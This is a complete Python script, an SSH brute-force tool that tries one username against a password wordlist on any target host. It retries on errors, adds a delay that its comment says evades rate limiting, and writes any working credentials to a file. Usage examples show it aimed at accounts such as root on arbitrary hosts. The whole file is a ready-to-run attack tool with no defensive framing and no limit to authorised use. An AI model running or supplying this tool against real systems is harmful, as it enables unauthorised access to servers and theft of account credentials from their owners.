#!/usr/bin/env python3
"""
Simple SSH Brute-Force Tool
Tests a single username against a list of passwords to gain SSH access.
"""

import paramiko
import argparse
import sys
import time
import socket
from typing import List, Optional


class SSHBruteForcer:
    """Simple SSH brute-force tool for testing password combinations."""
    
    def __init__(self, hostname: str, port: int = 22, timeout: int = 10, max_retries: int = 3, retry_delay: int = 2):
        """
        Initialize the SSH brute-forcer.
        
        Args:
            hostname: Target SSH server hostname or IP
            port: SSH port (default: 22)
            timeout: Connection timeout in seconds (default: 10)
            max_retries: Maximum retry attempts for failed connections (default: 3)
            retry_delay: Delay between retries in seconds (default: 2)
        """
        self.hostname = hostname
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.found_credentials = []
    
    def test_connection(self, username: str, password: str) -> bool:
        """
        Test SSH connection with given credentials.
        
        Args:
            username: SSH username
            password: SSH password
            
        Returns:
            True if connection successful, False otherwise
        """
        ssh_client = None
        for attempt in range(self.max_retries):
            try:
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                ssh_client.connect(
                    hostname=self.hostname,
                    port=self.port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                # Connection successful
                print(f"[+] SUCCESS! Username: {username}, Password: {password}")
                return True
                
            except paramiko.AuthenticationException:
                # Authentication failed - wrong password
                return False
                
            except (paramiko.SSHException, socket.error, OSError, Exception) as e:
                # Network error or SSH error - retry
                if attempt < self.max_retries - 1:
                    print(f"[-] Connection error (attempt {attempt + 1}/{self.max_retries}): {str(e)}")
                    print(f"[*] Retrying in {self.retry_delay} seconds...")
                    time.sleep(self.retry_delay)
                else:
                    print(f"[-] Failed after {self.max_retries} attempts: {str(e)}")
                    return False
                    
            finally:
                if ssh_client:
                    try:
                        ssh_client.close()
                    except:
                        pass
        
        return False
    
    def brute_force(self, username: str, password_list: List[str]) -> Optional[tuple]:
        """
        Brute-force SSH with username and password list.
        
        Args:
            username: SSH username to test
            password_list: List of passwords to try
            
        Returns:
            Tuple of (username, password) if successful, None otherwise
        """
        print(f"[*] Starting brute-force attack on {self.hostname}:{self.port}")
        print(f"[*] Username: {username}")
        print(f"[*] Testing {len(password_list)} passwords...")
        print("-" * 60)
        
        for i, password in enumerate(password_list, 1):
            print(f"[{i}/{len(password_list)}] Trying password: {password}")
            
            if self.test_connection(username, password):
                self.found_credentials.append((username, password))
                return (username, password)
            
            # Small delay to avoid rate limiting
            time.sleep(0.1)
        
        print("-" * 60)
        print("[*] Brute-force attack completed. No valid credentials found.")
        return None
    
    def save_credentials(self, output_file: str = "found_credentials.txt"):
        """
        Save found credentials to a file.
        
        Args:
            output_file: Output filename
        """
        if not self.found_credentials:
            print("[*] No credentials to save.")
            return
        
        try:
            with open(output_file, 'w') as f:
                for username, password in self.found_credentials:
                    f.write(f"{username}:{password}\n")
            print(f"[+] Credentials saved to {output_file}")
        except Exception as e:
            print(f"[-] Error saving credentials: {str(e)}")


def load_password_list(filename: str) -> List[str]:
    """
    Load passwords from a file.
    
    Args:
        filename: Path to password list file
        
    Returns:
        List of passwords
    """
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"[-] Error: Password file '{filename}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading password file: {str(e)}")
        sys.exit(1)


def main():
    """Main function to run the SSH brute-force tool."""
    parser = argparse.ArgumentParser(
        description="Simple SSH Brute-Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ssh_brute.py -H 192.168.1.100 -u admin -P passwords.txt
  python ssh_brute.py -H example.com -u root -P wordlist.txt -p 2222 -o found.txt
        """
    )
    
    parser.add_argument('-H', '--host', required=True, help='Target SSH hostname or IP address')
    parser.add_argument('-u', '--username', required=True, help='SSH username to test')
    parser.add_argument('-P', '--passwords', required=True, help='Path to password list file')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Connection timeout in seconds (default: 10)')
    parser.add_argument('-r', '--retries', type=int, default=3, help='Maximum retry attempts (default: 3)')
    parser.add_argument('-d', '--delay', type=int, default=2, help='Retry delay in seconds (default: 2)')
    parser.add_argument('-o', '--output', default='found_credentials.txt', help='Output file for found credentials (default: found_credentials.txt)')
    
    args = parser.parse_args()
    
    # Load password list
    print(f"[*] Loading password list from {args.passwords}...")
    password_list = load_password_list(args.passwords)
    
    if not password_list:
        print("[-] Error: Password list is empty.")
        sys.exit(1)
    
    # Initialize brute-forcer
    brute_forcer = SSHBruteForcer(
        hostname=args.host,
        port=args.port,
        timeout=args.timeout,
        max_retries=args.retries,
        retry_delay=args.delay
    )
    
    # Start brute-force attack
    result = brute_forcer.brute_force(args.username, password_list)
    
    # Save credentials if found
    if result:
        brute_forcer.save_credentials(args.output)
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()

